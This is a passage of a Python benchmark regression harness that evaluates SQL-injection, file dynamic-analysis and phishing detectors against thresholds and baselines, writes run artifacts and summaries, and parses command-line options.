    overall = report.get("overall") if isinstance(report.get("overall"), dict) else {}
    missing_reason_codes = int(overall.get("missing_reason_code_count") or 0)
    if bool(cfg_root.get("require_reason_code_for_actionable_decisions")) and missing_reason_codes > 0:
        reasons.append(
            f"file.dynamic_policy: missing reason codes for actionable decisions ({missing_reason_codes} rows)"
        )

    state_payload = report.get("dynamic_states") if isinstance(report.get("dynamic_states"), dict) else {}
    required_state_keys = list(cfg_root.get("required_dynamic_state_keys") or [])
    for key in required_state_keys:
        if key not in state_payload:
            reasons.append(f"file.dynamic_policy: dynamic_states missing '{key}'")

    provider_readiness = report.get("provider_readiness") if isinstance(report.get("provider_readiness"), dict) else {}
    provider_run_label = _norm_slug(provider_readiness.get("run_label"))
    valid_provider_labels = {"disabled", "fake", "misconfigured", "live_not_validated", "live_validated"}
    if provider_run_label not in valid_provider_labels:
        reasons.append("file.dynamic_policy: provider_readiness.run_label missing or invalid")

    benign_cfg = cfg_root.get("benign_family_request_rate_ceiling")
    family_slices = (
        ((report.get("slices") or {}).get("file_family") or {})
        if isinstance(report.get("slices"), dict)
        else {}
    )
    if isinstance(benign_cfg, dict) and bool(benign_cfg.get("enabled")) and isinstance(family_slices, dict):
        min_samples = int(benign_cfg.get("min_sample_count") or 0)
        max_rate = _safe_float(benign_cfg.get("max_request_rate"), default=1.0)
        for family_name, metrics in family_slices.items():
            if not isinstance(metrics, dict):
                continue
            sample_count = int(metrics.get("sample_count") or 0)
            if min_samples > 0 and sample_count < min_samples:
                continue
            if not bool(metrics.get("benign_only")):
                continue
            req_rate = _safe_float(metrics.get("request_rate"))
            if req_rate > max_rate:
                reasons.append(
                    f"file.dynamic_policy.file_family.{family_name}: request_rate {req_rate:.4f} > {max_rate:.4f} for benign-only slice"
                )

    return {"passed": len(reasons) == 0, "reasons": reasons}


def _ensure_thresholds_file(path: Path) -> Dict[str, Any]:
    if not path.exists():
        _write_json(path, DEFAULT_THRESHOLDS)
        return DEFAULT_THRESHOLDS
    loaded = _read_json(path, DEFAULT_THRESHOLDS)
    return loaded if isinstance(loaded, dict) else DEFAULT_THRESHOLDS


def _save_predictions_csv(path: Path, rows: Sequence[Dict[str, Any]]) -> None:
    pd.DataFrame(list(rows)).to_csv(path, index=False)


def _persist_file_dynamic_policy_artifacts(run_dir: Path, report: Dict[str, Any]) -> None:
    if not isinstance(report, dict):
        return
    artifact_map = {
        "file_dynamic_policy_overall.json": report.get("overall") or {},
        "file_dynamic_policy_request_decisions.json": report.get("request_decisions") or {},
        "file_dynamic_policy_reason_codes.json": report.get("reason_codes") or {},
        "file_dynamic_policy_skip_reasons.json": report.get("skip_reasons") or {},
        "file_dynamic_policy_policy_profiles.json": report.get("policy_profiles") or {},
        "file_dynamic_policy_dynamic_states.json": report.get("dynamic_states") or {},
        "file_dynamic_policy_provider_readiness.json": report.get("provider_readiness") or {},
        "file_dynamic_policy_family_severity_slices.json": report.get("slices") or {},
        "file_dynamic_policy_ioc_evidence_deltas.json": report.get("informational_deltas") or {},
        "file_dynamic_policy_summary.json": report,
    }
    for name, payload in artifact_map.items():
        _write_json(run_dir / name, payload)
    (run_dir / "file_dynamic_policy_summary.md").write_text(
        _to_file_dynamic_policy_markdown(report),
        encoding="utf-8",
    )


def _copy_latest_artifacts(run_dir: Path, benchmark_root: Path) -> None:
    latest_dir = benchmark_root / "runs" / "latest"
    if latest_dir.exists():
        shutil.rmtree(latest_dir)
    shutil.copytree(run_dir, latest_dir)


def _domain_source_inventory(corpus_root: Path) -> Dict[str, Any]:
    inventory: Dict[str, Any] = {}
    domain_keywords = {
        "sql": ("sql",),
        "file": ("file",),
        "phishing": ("spam", "phishing", "email"),
    }
    for domain, keywords in domain_keywords.items():
        raw_files = sorted(
            [str(p.relative_to(REPO_ROOT)) for p in (corpus_root / domain / "raw").glob("*") if p.is_file()]
        )
        test_files = []
        for p in (BACKEND_ROOT / "tests").rglob("test_*.py"):
            name = p.name.lower()
            if any(k in name for k in keywords):
                test_files.append(str(p.relative_to(REPO_ROOT)))
        inventory[domain] = {"raw_files": raw_files, "test_files": sorted(test_files)}
    return inventory


def _domain_weakness_report(dataset: DomainDataset) -> List[str]:
    frame = dataset.frame
    domain = dataset.domain
    findings: List[str] = []
    total = len(frame)
    if total < 100:
        findings.append(f"{domain}: small corpus size ({total} rows).")

    label_counts = frame["label"].value_counts().to_dict()
    pos = int(label_counts.get(1, 0))
    neg = int(label_counts.get(0, 0))
    if pos == 0 or neg == 0:
        findings.append(f"{domain}: label coverage incomplete (pos={pos}, neg={neg}).")
    elif max(pos, neg) / max(1, min(pos, neg)) > 4.0:
        findings.append(f"{domain}: class imbalance is high (pos={pos}, neg={neg}).")

    source_counts = frame["source_file"].value_counts().to_dict()
    synthetic_markers = ("seed", "template", "weaklabels", "synthetic")
    synthetic_rows = 0
    for source_name, count in source_counts.items():
        s = str(source_name or "").lower()
        if any(marker in s for marker in synthetic_markers):
            synthetic_rows += int(count)
    synthetic_ratio = float(synthetic_rows / total) if total else 0.0
    if synthetic_ratio >= 0.75:
        findings.append(f"{domain}: high synthetic/weaklabel ratio ({synthetic_ratio:.1%}).")

    if domain == "sql":
        if "benchmark_group" not in frame.columns:
            findings.append("sql: missing benchmark_group metadata (tuning/regression/held_out).")
        else:
            groups = set(str(v or "").strip().lower() for v in frame["benchmark_group"].tolist())
            if "held_out_adversarial" not in groups:
                findings.append("sql: no held_out_adversarial samples detected.")
            if not ({"tuning", "regression"} & groups):
                findings.append("sql: no tuning/regression split metadata detected.")

    if not findings:
        findings.append(f"{domain}: no obvious corpus warning from structural checks.")
    return findings


def _build_corpus_summary(dataset: DomainDataset) -> Dict[str, Any]:
    frame = dataset.frame
    benchmark_groups = (
        {str(k): int(v) for k, v in frame["benchmark_group"].value_counts().to_dict().items()}
        if "benchmark_group" in frame.columns
        else {}
    )
    return {
        "path": str(dataset.source_file.relative_to(REPO_ROOT)),
        "hash_sha256": dataset.source_hash,
        "version": dataset.source_version,
        "rows": int(len(frame)),
        "labels": {str(k): int(v) for k, v in frame["label"].value_counts().to_dict().items()},
        "scenarios": {str(k): int(v) for k, v in frame["scenario"].value_counts().to_dict().items()},
        "benchmark_groups": benchmark_groups,
    }


def _to_markdown_summary(payload: Dict[str, Any]) -> str:
    file_result = (payload.get("results") or {}).get("file") or {}
    provider_run_label = (
        str(file_result.get("dynamic_provider_run_label") or "").strip()
        if isinstance(file_result, dict)
        else ""
    ) or "n/a"
    lines = [
        f"# Benchmark Regression Summary ({payload.get('run_id')})",
        "",
        f"- Recorded at: `{payload.get('generated_at')}`",
        f"- SQL scope: `{payload.get('sql_scope', 'combined')}`",
        f"- File dynamic runtime mode: `{(payload.get('file_dynamic_runtime') or {}).get('mode', 'inherit')}`",
        f"- File dynamic provider run label: `{provider_run_label}`",
        f"- Execution passed: `{payload.get('execution', {}).get('passed')}`",
        f"- Quality gate passed: `{payload.get('quality_gate', {}).get('passed')}`",
        "",
        "## Domain Metrics",
    ]
    for key, metrics in _flatten_gated_metrics(payload.get("results") or {}).items():
        lines.append(
            f"- `{key}`: precision={metrics.get('precision')}, recall={metrics.get('recall')}, "
            f"f1={metrics.get('f1')}, fpr={metrics.get('false_positive_rate')}, "
            f"hs_miss={metrics.get('high_severity_miss_rate')}"
        )
    lines.append("")
    lines.append("## Gate Reasons")
    reasons = payload.get("quality_gate", {}).get("reasons") or []
    if reasons:
        lines.extend([f"- {str(reason)}" for reason in reasons])
    else:
        lines.append("- No gate failures.")
    sql_result = (payload.get("results") or {}).get("sql") or {}
    held_out = sql_result.get("held_out_only") or {}
    if isinstance(held_out, dict) and held_out:
        held_metrics = ((held_out.get("metrics") or {}).get("enforcement") or {})
        if isinstance(held_metrics, dict):
            lines.append("")
            lines.append("## SQL Held-Out Enforcement")
            lines.append(
                "- "
                f"sample_count={held_out.get('sample_count')}, "
                f"precision={held_metrics.get('precision')}, "
                f"recall={held_metrics.get('recall')}, "
                f"f1={held_metrics.get('f1')}, "
                f"fpr={held_metrics.get('false_positive_rate')}, "
                f"hs_miss={held_metrics.get('high_severity_miss_rate')}"
            )
    file_dynamic = file_result.get("dynamic_policy") if isinstance(file_result, dict) else None
    if isinstance(file_dynamic, dict) and file_dynamic:
        overall = file_dynamic.get("overall") or {}
        lines.append("")
        lines.append("## File Dynamic-Policy")
        lines.append(
            "- "
            f"request_rate={overall.get('request_rate')}, "
            f"skip_rate={overall.get('skip_rate')}, "
            f"completed_rate={overall.get('completed_rate')}, "
            f"unavailable_rate={overall.get('unavailable_rate')}, "
            f"failed_rate={overall.get('failed_rate')}, "
            f"running_or_deferred_rate={overall.get('running_or_deferred_rate')}"
        )
        top_decisions = list((file_dynamic.get("request_decisions") or {}).items())[:3]
        if top_decisions:
            top_chunks: List[str] = []
            for key, stats in top_decisions:
                top_chunks.append(f"{key}:count={stats.get('count')} rate={stats.get('rate')}")
            lines.append("- top_request_decisions: " + "; ".join(top_chunks))
        info = file_dynamic.get("informational_deltas") or {}
        lines.append(
            "- "
            f"dynamic_ioc_delta_total={info.get('additional_iocs_from_dynamic_total')}, "
            f"dynamic_evidence_delta_total={info.get('additional_evidence_items_from_dynamic_total')}"
        )
    return "\n".join(lines) + "\n"


def _store_baseline(*, baseline_file: Path, summary_payload: Dict[str, Any]) -> None:
    history_dir = baseline_file.parent / "history"
    history_dir.mkdir(parents=True, exist_ok=True)
    run_id = str(summary_payload.get("run_id") or datetime.now(timezone.utc).strftime("%Y%m%d%H%M%S"))
    _write_json(history_dir / f"{run_id}.json", summary_payload)
    _write_json(baseline_file, summary_payload)


def _resolve_file_dynamic_runtime(args: argparse.Namespace) -> Dict[str, Any]:
    mode = _norm_slug(getattr(args, "file_dynamic_mode", "inherit") or "inherit") or "inherit"
    poll = _safe_float(getattr(args, "file_dynamic_poll_interval_seconds", None), 0.05)
    max_wait = _safe_float(getattr(args, "file_dynamic_max_wait_seconds", None), 1.0)
    if mode == "inherit":
        return {"mode": "inherit", "enabled": None, "provider_name": None, "provider_config": None}
    if mode == "disabled":
        return {
            "mode": "disabled",
            "enabled": False,
            "provider_name": "none",
            "provider_config": {"reason": "benchmark_dynamic_disabled"},
            "poll_interval_seconds": poll,
            "max_wait_seconds": max_wait,
        }
    if mode == "fake":
        return {
            "mode": "fake",
            "enabled": True,
            "provider_name": "fake",
            "provider_config": {
                "completion_polls": int(getattr(args, "file_dynamic_fake_completion_polls", 1) or 1),
                "fail": bool(getattr(args, "file_dynamic_fake_fail", False)),
                "failure_reason": str(getattr(args, "file_dynamic_fake_failure_reason", "provider_failed")),
            },
            "poll_interval_seconds": poll,
            "max_wait_seconds": max_wait,
        }
    if mode == "http":
        return {
            "mode": "http",
            "enabled": True,
            "provider_name": "http",
            "provider_config": {
                "base_url": str(getattr(args, "file_http_provider_base_url", "") or "").strip(),
                "api_key": str(getattr(args, "file_http_provider_api_key", "") or "").strip() or None,
                "submit_path": str(getattr(args, "file_http_provider_submit_path", "/v1/dynamic/submit") or "/v1/dynamic/submit"),
                "status_path_template": str(
                    getattr(args, "file_http_provider_status_path_template", "/v1/dynamic/status/{submission_id}") or "/v1/dynamic/status/{submission_id}"
                ),
                "result_path_template": str(
                    getattr(args, "file_http_provider_result_path_template", "/v1/dynamic/result/{submission_id}") or "/v1/dynamic/result/{submission_id}"
                ),
                "timeout_seconds": _safe_float(getattr(args, "file_http_provider_timeout_seconds", 10.0), 10.0),
                "verify_tls": not bool(getattr(args, "file_http_provider_insecure", False)),
            },
            "poll_interval_seconds": poll,
            "max_wait_seconds": max_wait,
        }
    return {"mode": mode, "enabled": None, "provider_name": None, "provider_config": None}


def parse_args(argv: Optional[Iterable[str]] = None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Run reproducible SQL/file/phishing benchmark regression harness.")
    parser.add_argument("--domain", choices=["sql", "file", "phishing", "all"], default="all")
    parser.add_argument("--corpus-root", type=str, default=str(CORPUS_ROOT_DEFAULT))
    parser.add_argument("--benchmark-root", type=str, default=str(BENCHMARK_ROOT_DEFAULT))
    parser.add_argument("--thresholds-file", type=str, default=str(BENCHMARK_ROOT_DEFAULT / "thresholds" / "default_thresholds.json"))
    parser.add_argument("--baseline-file", type=str, default=str(BENCHMARK_ROOT_DEFAULT / "baselines" / "phase2_baseline_latest.json"))
    parser.add_argument("--max-samples", type=int, default=0, help="Optional cap per domain (0 means no cap).")
    parser.add_argument(
        "--sql-scope",
        choices=["combined", "original", "held_out", "tuning", "regression"],
        default="combined",
        help="SQL benchmark subset scope; ignored for file/phishing domains.",
    )
    parser.add_argument("--disable-transformer", action="store_true", help="Disable optional transformer for deterministic phishing benchmark runs.")
    parser.add_argument(
        "--file-dynamic-mode",
        choices=["inherit", "disabled", "fake", "http"],
        default="inherit",
        help="File dynamic provider runtime mode for benchmark execution.",
    )
    parser.add_argument(
        "--file-dynamic-poll-interval-seconds",
        type=float,
        default=0.05,
        help="Polling interval for file dynamic provider status during benchmark runs.",
    )
    parser.add_argument(
        "--file-dynamic-max-wait-seconds",
        type=float,
        default=1.0,
        help="Max wait window for dynamic provider completion during benchmark runs.",
    )
    parser.add_argument("--file-dynamic-fake-completion-polls", type=int, default=1)
    parser.add_argument("--file-dynamic-fake-fail", action="store_true")
    parser.add_argument("--file-dynamic-fake-failure-reason", type=str, default="provider_failed")
    parser.add_argument("--file-http-provider-base-url", type=str, default="")
    parser.add_argument("--file-http-provider-api-key", type=str, default="")
    parser.add_argument("--file-http-provider-submit-path", type=str, default="/v1/dynamic/submit")
    parser.add_argument(
        "--file-http-provider-status-path-template",
        type=str,
        default="/v1/dynamic/status/{submission_id}",
    )
    parser.add_argument(
        "--file-http-provider-result-path-template",
        type=str,
        default="/v1/dynamic/result/{submission_id}",
    )
    parser.add_argument("--file-http-provider-timeout-seconds", type=float, default=10.0)
    parser.add_argument("--file-http-provider-insecure", action="store_true")
    parser.add_argument("--strict-gate", action="store_true", help="Exit non-zero when regression/threshold gate fails.")
    parser.add_argument("--update-baseline", action="store_true", help="Persist current run as the new baseline artifact.")
    return parser.parse_args(list(argv) if argv is not None else None)


def main(argv: Optional[Iterable[str]] = None) -> int:
    args = parse_args(argv)
    corpus_root = Path(args.corpus_root).resolve()
    benchmark_root = Path(args.benchmark_root).resolve()
    thresholds_file = Path(args.thresholds_file).resolve()
    baseline_file = Path(args.baseline_file).resolve()
    max_samples = int(args.max_samples) if int(args.max_samples) > 0 else None

    run_id = datetime.now(timezone.utc).strftime("%Y%m%d%H%M%S")
    run_dir = benchmark_root / "runs" / run_id
    run_dir.mkdir(parents=True, exist_ok=True)
    (run_dir / "corpora").mkdir(parents=True, exist_ok=True)

    domains = ["sql", "file", "phishing"] if args.domain == "all" else [args.domain]
    file_dynamic_runtime = _resolve_file_dynamic_runtime(args)
    datasets = {
        d: _load_domain_dataset(
            corpus_root=corpus_root,
            domain=d,
            max_samples=max_samples,
            sql_scope=str(args.sql_scope or "combined"),
        )
        for d in domains
    }
    for domain, dataset in datasets.items():
        shutil.copy2(dataset.source_file, run_dir / "corpora" / f"{domain}_corpus_input.csv")

    results: Dict[str, Any] = {}
    if "sql" in domains:
        results["sql"] = run_sql_benchmark(datasets["sql"])
        _save_predictions_csv(run_dir / "sql_predictions.csv", results["sql"]["predictions"])
    if "file" in domains:
        results["file"] = run_file_benchmark(datasets["file"], dynamic_runtime=file_dynamic_runtime)
        _save_predictions_csv(run_dir / "file_predictions.csv", results["file"]["predictions"])
    if "phishing" in domains:
        results["phishing"] = run_phishing_benchmark(datasets["phishing"], disable_transformer=bool(args.disable_transformer))
        _save_predictions_csv(run_dir / "phishing_predictions.csv", results["phishing"]["predictions"])

    thresholds = _ensure_thresholds_file(thresholds_file)
    baseline_payload = _read_json(baseline_file, {})
    baseline_metrics = _flatten_gated_metrics((baseline_payload or {}).get("results") or {})
    current_metrics = _flatten_gated_metrics(results)
    domain_gate = evaluate_regression_gate(
        current_metrics=current_metrics,
        baseline_metrics=baseline_metrics,
        thresholds=thresholds,
    )
    sql_slice_gate = evaluate_sql_slice_gate(results=results, thresholds=thresholds)
    sql_heldout_gate = (
        evaluate_sql_heldout_gate(results=results, thresholds=thresholds)
        if "sql" in domains and str(args.sql_scope or "combined") == "combined"
        else {"passed": True, "reasons": []}
    )
    file_dynamic_policy_gate = (
        evaluate_file_dynamic_policy_gate(results=results, thresholds=thresholds)
        if "file" in domains
        else {"passed": True, "reasons": []}
    )
    quality_reasons = (
        list(domain_gate.get("reasons") or [])
        + list(sql_slice_gate.get("reasons") or [])
        + list(sql_heldout_gate.get("reasons") or [])
        + list(file_dynamic_policy_gate.get("reasons") or [])
    )
    quality_gate = {
        "passed": len(quality_reasons) == 0,
        "reasons": quality_reasons,
        "components": {
            "domain_metrics": domain_gate,
            "sql_slice_metrics": sql_slice_gate,
            "sql_heldout_metrics": sql_heldout_gate,
            "file_dynamic_policy_metrics": file_dynamic_policy_gate,
        },
    }
    execution_gate = {"passed": True, "reasons": []}
    gate = {
        "passed": bool(quality_gate.get("passed")),
        "reasons": list(quality_gate.get("reasons") or []),
        "execution": execution_gate,
        "quality": quality_gate,
    }

    weaknesses: List[str] = []
    for domain in domains:
        weaknesses.extend(_domain_weakness_report(datasets[domain]))

    summary_payload = {
        "run_id": run_id,
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "domains": domains,
        "sql_scope": str(args.sql_scope or "combined"),
        "file_dynamic_runtime": file_dynamic_runtime,
        "results": results,
        "current_metrics": current_metrics,
        "corpus": {domain: _build_corpus_summary(ds) for domain, ds in datasets.items()},
        "discovery": _domain_source_inventory(corpus_root),
        "execution": execution_gate,
        "quality_gate": quality_gate,
        "gate": gate,
        "thresholds_file": str(thresholds_file.relative_to(REPO_ROOT)) if thresholds_file.is_relative_to(REPO_ROOT) else str(thresholds_file),
        "baseline_file": str(baseline_file.relative_to(REPO_ROOT)) if baseline_file.is_relative_to(REPO_ROOT) else str(baseline_file),
        "baseline_present": bool(isinstance(baseline_payload, dict) and baseline_payload),
        "weaknesses": weaknesses,
    }

    _write_json(run_dir / "summary.json", summary_payload)
    (run_dir / "summary.md").write_text(_to_markdown_summary(summary_payload), encoding="utf-8")
    _write_json(run_dir / "thresholds_effective.json", thresholds)
    _write_json(run_dir / "gate_result.json", gate)
    if isinstance((results.get("file") or {}).get("dynamic_provider_status"), dict):
        _write_json(
            run_dir / "file_dynamic_provider_status.json",
            (results.get("file") or {}).get("dynamic_provider_status"),
        )
    if isinstance((results.get("file") or {}).get("dynamic_policy"), dict):
        _persist_file_dynamic_policy_artifacts(
            run_dir,
            (results.get("file") or {}).get("dynamic_policy") or {},
        )
    if args.update_baseline:
        _store_baseline(baseline_file=baseline_file, summary_payload=summary_payload)

    _copy_latest_artifacts(run_dir, benchmark_root)
    _write_json(benchmark_root / "runs" / "latest_summary.json", summary_payload)

    print(json.dumps({"run_id": run_id, "gate_passed": gate.get("passed"), "run_dir": str(run_dir)}, indent=2))
    if args.strict_gate and not bool(gate.get("passed")):
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
